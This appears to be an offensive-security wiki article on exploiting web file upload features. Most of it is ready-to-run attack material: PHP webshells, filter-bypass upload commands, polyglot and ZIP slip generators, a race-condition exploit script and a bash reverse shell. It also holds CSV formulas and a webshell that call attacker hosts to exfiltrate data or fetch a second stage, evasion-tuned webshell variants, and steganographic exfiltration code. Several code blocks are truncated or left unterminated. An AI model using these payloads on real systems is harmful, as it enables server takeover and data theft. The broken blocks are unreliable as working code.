File Upload

Exploiting insecure file upload mechanisms to bypass filters, upload webshells, achieve remote code execution, and establish persistence on target systems.

Overview

A file upload feature lets an attacker place content on the server. When that content lands in a directory the web server treats as executable, the upload becomes remote code execution. This article walks through blacklist and whitelist bypasses, content-type and magic-byte tricks, polyglot and SVG payloads, archive path traversal, and race conditions, and shows how to turn each one into a working webshell.

Required Reading

  • /wiki/articles/fundamentals/http.html - multipart/form-data, Content-Type headers, request encoding
  • /wiki/articles/fundamentals/filesystems.html - file extensions, MIME types, filesystem structure
  • /wiki/articles/fundamentals/unix-permissions.html - execute permissions, directory write permissions

The Attack Surface

A file upload endpoint that accepts arbitrary files and places them in a web-accessible directory is a remote code execution vector. The attacker uploads a script, requests its URL , and the web server executes it. The defensive challenge is that web applications need file uploads - profile pictures, document sharing, invoice attachments, CSV imports. Every upload is a potential entry point.

The security boundary is: can the attacker store executable content in a location the web server will interpret as code? Every filter - extension checks, content-type validation, MIME sniffing, image verification

  • is an attempt to enforce this boundary. Every bypass technique subverts one of these checks.

The Baseline: Unrestricted Upload

The simplest case - no validation whatsoever. A pure demonstration of the core vulnerability.

# Target: https://example.com/upload — accepts any file, stores in /uploads/

# Step 1: Create a minimal PHP webshell
cat > shell.php << 'EOF'
<?php system($_GET['cmd']); ?>
EOF

# Step 2: Upload via multipart form
curl -s -X POST 'https://example.com/upload' \
  -F "file=@shell.php"

# Step 3: Execute commands
curl -s 'https://example.com/uploads/shell.php?cmd=id'
curl -s 'https://example.com/uploads/shell.php?cmd=ls+-la+/var/www/'
curl -s 'https://example.com/uploads/shell.php?cmd=cat+/etc/passwd'

# Step 4: Deploy reverse shell through the webshell
curl -s 'https://example.com/uploads/shell.php?cmd=bash+-c+%22bash+-i+%3E%26+/dev/tcp/10.0.0.1/4444+0%3E%261%22'

Double Extension

# Apache + PHP with AddHandler:
# AddHandler application/x-httpd-php .php
# File: shell.php.jpg → Apache sees .jpg (ignores), then .php (handles as PHP)
echo '<?php system($_GET["cmd"]); ?>' > shell.php.jpg
curl -s -X POST 'https://example.com/upload' -F "file=@shell.php.jpg"
curl -s 'https://example.com/uploads/shell.php.jpg?cmd=id'

# Reverse double extension (works on some configurations):
echo '<?php system($_GET["cmd"]); ?>' > shell.jpg.php
curl -s -X POST 'https://example.com/upload' -F "file=@shell.jpg.php"

Null Byte Injection

# The file system sees the filename up to the null byte
# Application validation sees the full filename including .jpg
# File stored as: shell.php (the \0.jpg part is discarded at the C level)

# URL-encoded null byte:
echo '<?php system($_GET["cmd"]); ?>' > shell.php
curl -s -X POST 'https://example.com/upload' \
  -F 'file=@shell.php;filename=shell.php%00.jpg'

# Literal null byte in multipart content (requires raw request crafting)
printf '<?php system($_GET["cmd"]); ?>\n' > shell.php

Trailing Characters

# Windows: trailing dots and spaces are stripped
# shell.php. → stored as shell.php
# shell.php  → stored as shell.php (trailing space)
# shell.php:streamname → NTFS alternate data stream

# Unix: trailing characters are part of the filename
# shell.php\n → stored literally with newline (test with %0a)
echo '<?php system($_GET["cmd"]); ?>' > shell.php
curl -s -X POST 'https://example.com/upload' \
  -F 'file=@shell.php;filename=shell.php%0a'

Extension Whitelist Bypass

Whitelists are stronger than blacklists but still breakable when the server configuration misinterprets extensions. 

# If only .jpg, .jpeg, .png, .gif are allowed:
# Option A: Apache .htaccess override
# Upload a .htaccess file that maps .jpg to PHP
cat > .htaccess << 'EOF'
AddType application/x-httpd-php .jpg
EOF
curl -s -X POST 'https://example.com/upload' -F 'file=@.htaccess;filename=.htaccess'

# Now upload a JPG file containing PHP code
echo '<?php system($_GET["cmd"]); ?>' > shell.jpg
curl -s -X POST 'https://example.com/upload' -F "file=@shell.jpg"
# The server now executes .jpg files as PHP
curl -s 'https://example.com/uploads/shell.jpg?cmd=id'

# Option B: Apache .htaccess with SetHandler
cat > .htaccess << 'EOF'
SetHandler application/x-httpd-php
EOF

# Option C: If .htaccess upload is blocked, try other Apache config files
# .htpasswd, .htgroup, .htaccess.bak
# Also try: AddHandler php5-script .jpg

# Option D: PHP .user.ini — PHP per-directory configuration (CGI/FastCGI only)
cat > .user.ini << 'EOF'

curl -s -X POST 'https://example.com/upload' -F 'file=@.user.ini;filename=.user.ini'
# Any PHP file in this directory will now prepend shell.jpg content before execution
curl -s -X POST 'https://example.com/upload' -F 'file=@shell.jpg;filename=shell.jpg'
# Now access any PHP file in the directory — shell.jpg executes first

Content-Type Validation Bypass

The Content-Type header in the multipart request is set by the client and can be modified trivially. 

# Server-side check:
# if ($_FILES['file']['type'] != 'image/jpeg') { reject; }

# Bypass: change the Content-Type header in the multipart boundary
curl -s -X POST 'https://example.com/upload' \
  -F 'file=@shell.php;type=image/jpeg'

# Or craft the multipart request manually to send any Content-Type:
cat > upload.txt << 'EOF'
------BOUNDARY
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET["cmd"]); ?>
------BOUNDARY--
EOF

curl -s -X POST 'https://example.com/upload' \
  -H 'Content-Type: multipart/form-data; boundary=----BOUNDARY' \
  --data-binary @upload.txt

Double Content-Type header

# Some parsers use the last Content-Type; others use the first
cat > upload2.txt << 'EOF'
------BOUNDARY
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg
Content-Type: application/x-php

<?php system($_GET["cmd"]); ?>
------BOUNDARY--

printf 'GIF89a\n<?php system($_GET["cmd"]); ?>\n' > shell.gif.php

printf 'GIF89a<?php system($_GET["cmd"]); ?>' > shell2.gif.php

Polyglot Files

A polyglot file is valid in multiple formats simultaneously. A file that is both a valid JPEG image and valid PHP code passes image validation while being executable as PHP . 

# Polyglot: JPEG + PHP
# JPEG files store metadata in EXIF segments. PHP code in the EXIF Comment field
# survives image processing and renders when the file is executed as PHP.

# Using exiftool to inject PHP code:
exiftool -Comment='<?php system($_GET["cmd"]); ?>' original.jpg -o polyglot.jpg.php

# Verify the polyglot works:
php -r "include 'polyglot.jpg.php';"  # No output (no cmd param)
php -r "\$_GET['cmd']='id'; include 'polyglot.jpg.php';"  # Should output: uid=...

# Upload and test
curl -s -X POST 'https://example.com/upload' \
  -F 'file=@polyglot.jpg.php;type=image/jpeg'
curl -s 'https://example.com/uploads/polyglot.jpg.php?cmd=id'

# Polyglot: GIF + PHP (manual — GIF is simpler)
# GIF files have a fixed header, logical screen descriptor, and optional comment extension
# The comment extension can contain arbitrary data including PHP code
python3 << 'PYEOF'
def create_gif_php_polyglot(filename, php_code):
    """Create a valid GIF file that is also valid PHP."""
    header = b'GIF89a'
    # Logical screen descriptor: width=1, height=1, packed=0, bg=0, aspect=0
    lsd = b'\x01\x00\x01\x00\x00\x00\x00'
    # GIF Comment Extension block
    comment_ext = b'\x21\xfe'
    comment_data = php_code.encode() if isinstance(php_code, str) else php_code
    # Comment sub-block (max 255 bytes per block, terminated by 0x00)
    comment_block = bytes([len(comment_data)]) + comment_data + b'\x00'
    # GIF trailer
    trailer = b'\x3b'
    
    with open(filename, 'wb') as f:
        f.write(header + lsd + comment_ext + comment_block + trailer)

create_gif_php_polyglot('polyglot.gif.php', '<?php system($_GET["cmd"]); ?>')
print("Created polyglot GIF/PHP file")
PYEOF

# Verify: file is both valid GIF (opens in image viewers) and valid PHP
file polyglot.gif.php              # Should report: GIF image data
php -l polyglot.gif.php             # Should report: No syntax errors

SVG Upload to XSS

SVG files are XML -based vector images that can contain JavaScript. When uploaded and served, they execute in the browser context of the target domain.

CSV Injection (Formula Injection)

CSV files can contain spreadsheet formulas. When the target opens the CSV in Excel/LibreOffice, formulas execute. 

# Basic CSV injection payloads
# These execute when the exported CSV is opened in a spreadsheet application

# DDE - execute command on file open (Excel)
echo "=cmd|'/C calc'!A0" > payload.csv

# Hyperlink - open URL (any spreadsheet)
echo '=HYPERLINK("http://attacker.example.com/collect?data="&A1,"Click here")' > payload.csv

# Shell execution via CSV (LibreOffice on Linux)
echo '=WEBSERVICE("http://attacker.example.com/?"&A1)' > payload.csv
echo '=IMPORTXML(CONCAT("http://attacker.example.com/?",A1),"//data")' > payload.csv

# Data exfiltration via formula
echo '=CONCATENATE(A1,B1,C1)' > payload.csv

# Upload as a data import file
curl -s -X POST 'https://example.com/upload' \
  -F 'file=@payload.csv;type=text/csv'

ZIP Slip Path Traversal

When an application extracts a Z IP (or tar/gz/tar.bz2) archive, filenames inside the archive can contain ../ sequences. If the extraction code doesn't sanitize paths, files can be written outside the intended extraction directory. 

# Create a ZIP file with path traversal in the filename
# Target: overwrite /var/www/html/shell.php
echo '<?php system($_GET["cmd"]); ?>' > shell.php
zip malicious.zip shell.php

# Modify the ZIP entry filename to include traversal
python3 << 'PYEOF'
import zipfile

with zipfile.ZipFile('traversal.zip', 'w') as zf:
    # The filename in the archive contains ../ to escape the extraction directory
    zf.writestr('../../../var/www/html/shell.php',
                '<?php system($_GET["cmd"]); ?>')
    # Or create a symlink within the ZIP
    # zf.writestr('symlink.txt', '/etc/passwd')

print("Created traversal.zip")
PYEOF

# Upload the malicious ZIP
curl -s -X POST 'https://example.com/upload' \
  -F 'file=@traversal.zip;type=application/zip'
# If the app extracts to /var/www/uploads/:
# File writes to: /var/www/uploads/../../../var/www/html/shell.php
# Which resolves to: /var/www/html/shell.php

# Then access the webshell
curl -s 'https://example.com/shell.php?cmd=id'

Upload Race Condition

Some applications upload a file, validate it, and if invalid, delete it. Between upload and validation/deletion, there's a window where the file exists on disk and is accessible via the web. If the file is executable during that window, the attacker can request it. 

#!/bin/bash
# race-upload.sh — race condition exploit for upload+validate+delete pattern

TARGET="https://example.com/upload"
WEBSHELL="shell.php"
WEBSHELL_URL="https://example.com/uploads/$WEBSHELL"
CMD="id"

# Create webshell
echo '<?php system($_GET["cmd"]); ?>' > "$WEBSHELL"

# Start the racer — continuously request the webshell
# Once the upload lands and before validation deletes it, this gets execution
while true; do
  curl -s -o /dev/null -w "%{http_code}" "$WEBSHELL_URL?cmd=$CMD" 2>/dev/null
  echo ""
done &

RACER_PID=$!

# Continuously upload the webshell
for i in $(seq 1 1000); do
  curl -s -X POST "$TARGET" -F "file=@$WEBSHELL" -o /dev/null &
done

wait

# Cleanup
kill $RACER_PID 2>/dev/null

Webshell Variants and Tradecraft

# Minimal PHP webshell — one-liner, GET parameter
<?=`$_GET[c]`?>

# POST-based webshell — cleaner, doesn't appear in server access logs as easily
<?php system($_POST['c']); ?>

# Parameterized webshell — harder to signature-match
<?php $x=$_REQUEST['x']; $y=$_REQUEST['y']; $x($y); ?>
# Usage: /shell.php?x=system&y=id

# Encoded webshell — evades basic signature detection
<?php eval(base64_decode($_POST['code'])); ?>
# Usage: POST code=c3lzdGVtKCJpZCIpOw== (system("id");)

# Download-and-execute webshell — fetches second stage payload
<?php file_put_contents('/tmp/stager', file_get_contents('http://attacker.com/stager')); include '/tmp/stager'; ?>

# File manager webshell — browse, read, write files
# p0wny-shell: https://github.com/flozz/p0wny-shell
# Single-file PHP shell with file browser, command execution, and file upload
curl -o p0wny.php https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php
curl -s -X POST 'https://example.com/upload' -F "file=@p0wny.php"
						
# Python webshell (if the target runs Python WSGI/Flask/Django)
# Save as shell.py and upload
import os, subprocess, urllib.parse

def application(environ, start_response):

C2 via Steganography

Embedding command and control instructions in image metadata allows post-exploitation communication that appears as innocent image traffic. 

# steg-c2.sh — exfiltrate data via image EXIF metadata

# Setup: create a clean image
convert -size 100x100 xc:white clean.jpg

# Embed data in EXIF Comment field
exiftool -Comment="$(whoami | base64)" clean.jpg -o exfil.jpg

# Upload the image to target
curl -s -X POST 'https://example.com/profile/avatar' -F "avatar=@exfil.jpg"

# Extract on attacker side (if you can retrieve the image):
exiftool -b -Comment retrieved.jpg | base64 -d

# More advanced: encode data in LSB (Least Significant Bit) of pixel values
python3 << 'PYEOF'
from PIL import Image
import sys

def encode_lsb(image_path, data, output_path):
    """Encode binary data in the LSB of image pixels."""
    img = Image.open(image_path)
    pixels = list(img.getdata())
    data_bits = ''.join(format(byte, '08b') for byte in data.encode() + b'\x00')
    
    if len(data_bits) > len(pixels) * 3:
        raise ValueError("Data too large for image")
    
    new_pixels = []
    bit_idx = 0
    for pixel in pixels:
        if bit_idx + 3 <= len(data_bits):
            r = (pixel[0] & ~1) | int(data_bits[bit_idx])
            g = (pixel[1] & ~1) | int(data_bits[bit_idx + 1])
            b = (pixel[2] & ~1) | int(data_bits[bit_idx + 2])
            new_pixels.append((r, g, b))
            bit_idx += 3
        else:
            new_pixels.append(pixel)
    
    img.putdata(new_pixels)
    img.save(output_path)
    print(f"Encoded {len(data)} bytes into {output_path}")

def decode_lsb(image_path):
    """Extract LSB data from image."""
    img = Image.open(image_path)
    pixels = list(img.getdata())
    bits = []
    for pixel in pixels:
        bits.append(str(pixel[0] & 1))
        bits.append(str(pixel[1] & 1))
        bits.append(str(pixel[2] & 1))
    
    bytes_data = []
    for i in range(0, len(bits) - 7, 8):
        byte = int(''.join(bits[i:i+8]), 2)
        if byte == 0:
            break
        bytes_data.append(byte)
    return bytes(bytes_data).decode()

Common Mistakes

  1. Uploading the webshell to a non-web-accessible directory. If the file goes to /var/www/private/ but nginx only serves /var/www/public/ , the shell won't execute. Test multiple storage paths.
  2. Assuming '.php' is the only executable extension. Always test the full list: .phtml , .php5 , .php7 , .shtml , .asa , .cer , .jsp .
  3. Not checking for '.htaccess'/'.user.ini'/'web.config' upload possibility. Even if PHP files are blocked, uploading a config file can make the server interpret arbitrary extensions as PHP .
  4. Ignoring the upload directory listing. If directory listing is enabled, enumerate all uploaded files to find sensitive data uploaded by other users.
  5. Uploading large webshells when a size limit exists. Start with a one-liner webshell, then upload larger tools through the small shell.
  6. Not checking the response body for error messages. A 200 status code doesn't mean success. The body may say "invalid file type" or "upload failed."
  7. Forgetting that uploaded files may be renamed (UUID, timestamp). If the server renames files, you need directory listing or another information disclosure to find the new filename.
